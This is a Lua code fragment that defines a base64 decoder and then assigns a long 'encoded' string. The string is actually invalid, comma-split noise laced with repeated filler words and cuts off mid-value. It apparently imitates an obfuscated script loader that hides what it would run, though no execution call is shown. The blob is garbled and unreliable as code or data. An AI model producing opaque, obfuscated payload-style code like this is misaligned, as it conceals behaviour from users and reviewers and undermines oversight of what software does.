-- Base64 Decoding function
local function decode_base64(input)
    -- Base64 character set
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    
    -- Remove any characters not in the base64 character set
    input = string.gsub(input, '[^' .. b .. '=]', '')
    
    -- Convert each base64 character to its binary representation
    return (input:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
        end
        return string.char(c)
    end))
end

-- Encoded string
local encoded_string = "function hwMLAD9ayBheykiTLyGchaletyyannKWgpgqpRycmGAY7Xworldwx7Za99n3XRZCusxpeBmWhRzjZJbD98NTZRV,SIrGAYworld8um3chyannalet00hW1fcheyk4AJQhDXgbI1rz7GUsIDKflAbu1nPYPZFOpM0ANExYwWpxAqj3nh6wzM8etB3i8iFbY09g4kaqsXr7mOZG37bb,chaletRvMfhptuVEvJtqGAYietbcpyLzheyannyzFiworldaBFdV4rGbk2cWONcu4b0Eij02LcJNTH6u8pISTwF44qrbtfF,pUSIZZOUYp1PwNhwchaletorldeyY1UETbGAyannYHEaKmHq32rqkSM6OeK5vrt5qcbhdrO4b,exofGAyannYDOheyos5chaletdISSworldrSXPcqeQ2ZwSqj3Qyp1LDmaHQEoCzY7qz7t99idPN4hkyNsHIRtrRo5wGsh,oTNQHhey5zGAYiCwmz6btI87BC8NA7IW0tchayannlet7nworld0h5Z83BgTJpkiVeEaAKaDBZvBgIrJDhTIaahDyXCSMpPCbI02UPQgtcegkgv0,l2eGAYzoEchalet8HP4wsvunyannoWGPqeXnjplOalworldaZPKxcrbwpheyk5G4FQvkWaockBVJQiQ9LPKfYu7c1TZQzo22plg9RvZOMHFW0,gk4AFqOkVPhey7maKchalet6zScHW0I98lwyannorld60oYGAYAXj9Qoo9iXhWfJInAKtHsilng8GYZxSyhPCS4K,zyannzc0cchalethey9tworldMlYjaj6YCN8Jg74j52ALmo0jVlSGAYRcotyOlG9JVRwRYxd7USeXCn1Ybt5MgPpfdP7b5tzoKIETNnYTtepz49r7,i3ITmx0LatamGchaletAYTYdoHzyannCtoXt3heynyMAsQCZworldVWi7UY8royR4dpb0EExm6rD5JZ0nJ,Kyannzb1heynbA7yCochaletoY6wOjOXXVgmWGAYkworldvU3b8dF963ArHWutRTFATX2DEO8cJABx4hBhfZy7cqAzeFnvLK44MRw0VmQpefO8xQXnvXNXse,LkOYUworldkchaletoZTxhZEDhpAhLyannGAYvHPW7bYqhBPEyjy5kz9eheylfO4Cea2EzHB2zHPprvSMq9zroygIjdmp6tP0ukDpSV4t4lwOK5OZ4kyL1Aml,OqNbeyannFAaEzgfTUworld8cilpyfIVdCHLDGAY2chaletuAUCIsdheyJoV9Ptkx3Gu0bpnZAibqtl,M3IJV66zGchaletpyannxfu9pTworldu6q2SW6kefqtGAYVjisFscwRheyLysK9uO5gTXoN4BUVITYq6dMIHt9E,FEheyMPrjWbPsyannrcNGworchaletldAYT1apWA0Rh5qpifsvG7lKwHCes138jeATiNB7ebSlMhtgQEPezrtu8ZQ15XuVBjXvpn,jdvby9bzTyannRU6Vw1LkBaSwcBBe9cworlchaletdZ8yUAheyCACGAYrtt4Yf86PZGIhCoDyS4uK3EqXf6eeJvzrd6B5f0VI7,LAC8SJdwyGAY79LQ9yannHfVodGDmgchaletoIuheyQysjworldMUQSvKmvc9Y5hBbnHrLmKVF2Ow6A5LP,nIXLV5xI77xheyYworldrLdchalet4G3W1yannA59gyYXk6jGAYS5gdgVCo4FJ49giyFUF8gg9l58i5WaIv,yannworlddKhey0GAYXcfCFStfx0chaletpBUl3vc9nKOtXcqmrnH07FET1RPlaTimQWKFaEw9O3keQNkFDVXo,ZZhmnh6iBhworlchaletdeyiyGAYiNHQflJyyannqq9PS4OaZG9YfRioLKH7f3nuBw25IME2tHhP87I,pq24psLrchaletWTsvUF99FvdSehyannAOlzI7fKOqPIYuEheworldGAYyVpapOkqNnD3htXjSjTdGvjlsPv6ZXYgR6mLJ5MheGxhSKPPmCEKkB1,waxKCchalet7qVheyb7IaXoyann5GU7worldI6mPTEmLUxYfFDxqGAYbE1zFpmC6HR3V95zsn40TzMH7Z6UisXMGLFONB06d7qP,eUTchalyannetWworld9poGAYCH46J98wHzydwqm50UROye4LheycW2jO6SB8MfC1t3tu9JJ9cjPq,PAQ5yann3rGbdF5dhVWi7S49worldGAYJkchaletN5heytfmCyYxcUivNF6iXUci7ikVczOGdPSxqKe0fj9hBnGLpzkk4zk0CKBCq7WvUuxzBIQNb1P,NGAYSDheynchaletBGJbcyannlW0nfuworldjxCCwcGvHxj6HrFtdi7Y4H62jtp2m21Y1Opa6MPR3UZqGXYg92dttZXmqFtNQ9hIM1uLTJGiD9bfhpXl,UkHMcL9YQc1qRt6iQLdZnJheyichaletyannX9wB9qT1world6CtfTGAYW3huUOfijtZXQq5UX9p2wNR0i8qbUYyylo4Uq4fiPe,vworldHheychaletcU4U9HOC40tCrDOyannjhUXBBOORnuiD2TfLpGAYy4cHgek5CduVD8IEggWNs6mMWJmSFj5rTMNkp2uOq6GDkT8GQzHZl,worldOCiyann0J1VM0Sc4FO5heymRBx9Egp8KwGAYfrchalet4Qg8oPRX3Iorbrgj1gqmuGjjglc1C4LUYB0jaSEOGnVU1AyKhP2YiW0gvA,wDc
